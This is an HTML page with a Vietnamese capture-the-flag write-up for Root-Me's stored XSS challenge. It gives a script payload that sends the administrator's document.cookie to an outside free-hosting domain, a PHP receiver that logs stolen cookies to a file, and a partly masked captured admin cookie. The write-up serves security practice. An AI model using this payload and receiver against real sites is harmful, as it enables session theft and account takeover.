<main class="main" role="main">
    <div class="content">
        <article id="post-xss/xss_chall1" class="article article-type-post" itemscope="" itemtype="http://schema.org/BlogPosting">
            <div class="article-header">
                <h1 class="article-title" itemprop="name">
                    XSS - Stored 1
                </h1>
                <div class="article-meta"><a href="?page=<?php echo $parent; ?>"><span>Back To Home</span></a>
               </div>
            </div>
            <div class="article-entry marked-body" itemprop="articleBody">
                <h1 id="Thu-Thach"><a href="#Thu-Thach" class="headerlink" title="Thử Thách"></a>Thử Thách</h1>
                <p>URL: <a href="https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-1" target="_blank" rel="noopener">https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-1</a></p>
                <h2 id="Tieu-de"><a href="#Tieu-de" class="headerlink" title="Tiêu đề"></a>Tiêu đề</h2>
                <p>So easy to sploit?</p>
                <h2 id="Mo-ta"><a href="#Mo-ta" class="headerlink" title="Mô tả"></a>Mô tả</h2>
                <p>Steal the administrator session cookie and use it to validate this chall.</p>
                <button id="read-writeup"><span><img src="public/images/more.png" /></span>Xem Hướng Dẫn</button>
                <p style="color: red; margin-left: 10px; font-weight: bold">Hãy cố gắng tự làm bằng hết sức mình trước, xem hướng dẫn ngay từ đầu thì bạn sẽ mất nhiều thứ đó..</p>
                <script type="text/javascript">
                    $(document).ready(function(){
                        $("#read-writeup").click(function(){
                            $("#w-content").toggle();
                        });
                    });
                </script>
                <div id="w-content" style="display: none">
                <h1 id="Huong-Dan"><a href="#Huong-Dan" class="headerlink" title="Hướng Dẫn"></a>Hướng Dẫn</h1>
                <h3 id="Muc-tieu-tan-cong"><a href="#Muc-tieu-tan-cong" class="headerlink" title="Mục tiêu tấn công"></a>Mục tiêu tấn công</h3>
                <p>Vậy mục tiêu của chúng ta là lấy cookie sau đó nhờ đó mà đánh cắp sesssion của admin.<br>Cookie chính là flag.</p>
                <h3 id="Phan-tich"><a href="#Phan-tich" class="headerlink" title="Phân tích"></a>Phân tích</h3>
                <p>Vào thấy các form khá cơ bản là nhập tiêu đề mà tin nhắn cho admin.<br>Vậy ta chỉ cần để đoạn script 1 trong 2 rồi gửi cho admin là được.<br></p>
                <figure class="highlight html">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">new Image().src="https://vuongthieuis.000webhostapp.com/getcookie.php?cookie="+document.cookie;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p></p>
                <h3 id="Dung-server-de-nhan-cookie"><a href="#Dung-server-de-nhan-cookie" class="headerlink" title="Dựng server để nhận cookie"></a>Dựng server để nhận cookie</h3>
                <p>Một vấn đề khi làm XSS ngoài thực tế,đó chính là ta cần phải có địa chỉ IP Public ra ngoài cố định (có domain càng tốt).<br>Nếu bạn đã sở hữu host của mình thì tốt, nếu không có thể thử một số các hosting miễn phí như:</p>
                <ul>
                    <li><a href="https://vn.000webhost.com/" target="_blank" rel="noopener">https://vn.000webhost.com/</a></li>
                    <li><a href="https://www.hostinger.vn/free-hosting#gref" target="_blank" rel="noopener">https://www.hostinger.vn/free-hosting#gref</a></li>
                    <li><a href="https://www.freehosting.com/" target="_blank" rel="noopener">https://www.freehosting.com/</a></li>
                </ul>
                <p>Hoặc có thể tìm kiếm thêm trên mạng.<br>Sau đó, tải hoặc tạo file <strong>getcookie.php</strong> với nội dung:<br></p>
                <figure class="highlight php">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'cookie'</span>])){</span><br><span class="line">	<span class="keyword">echo</span> $_GET[<span class="string">'cookie'</span>];</span><br><span class="line">	$myfile = fopen(<span class="string">"cookie.txt"</span>, <span class="string">"a"</span>);</span><br><span class="line">	fwrite($myfile, <span class="string">"\n"</span>. $_GET[<span class="string">'cookie'</span>]);</span><br><span class="line">    fclose($myfile);</span><br><span class="line">    }</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p></p>
                <h3 id="Luu-y-Khong-phai-luc-nao-thu-muc-hien-hanh-cung-co-quyen-de-viet-nho-chon-duong-dan-cookie-txt-vao-thu-muc-co-quyen-write-vi-du-uploads-cookie-txt"><a href="#Luu-y-Khong-phai-luc-nao-thu-muc-hien-hanh-cung-co-quyen-de-viet-nho-chon-duong-dan-cookie-txt-vao-thu-muc-co-quyen-write-vi-du-uploads-cookie-txt" class="headerlink" title="Lưu ý: Không phải lúc nào thư mục hiện hành cũng có quyền để viết, nhớ chọn đường dẫn cookie.txt vào thư mục có quyền write, ví dụ uploads/cookie.txt"></a>Lưu ý: Không phải lúc nào thư mục hiện hành cũng có quyền để viết, nhớ chọn đường dẫn cookie.txt vào thư mục có quyền write, ví dụ uploads/cookie.txt</h3>
                <h3 id="Check-file-cookie-txt"><a href="#Check-file-cookie-txt" class="headerlink" title="Check file cookie.txt"></a>Check file cookie.txt</h3>
                <p>Đây là thành quả:</p>
                <blockquote>
                    <p>ADMIN_COOKIE=NkI9qe4cdLIO2P7MIs<strong>**</strong></p>
                </blockquote>
                <h3 id="Chiem-session-nhu-da-duoc-huong-dan-de-test-thu"><a href="#Chiem-session-nhu-da-duoc-huong-dan-de-test-thu" class="headerlink" title="Chiếm session như đã được hướng dẫn để test thử."></a>Chiếm session như đã được hướng dẫn để test thử.</h3>
                </div></div>
        </article>
        <section id="comments">
            <div id="vcomments"></div>
        </section>
    </div>

</main>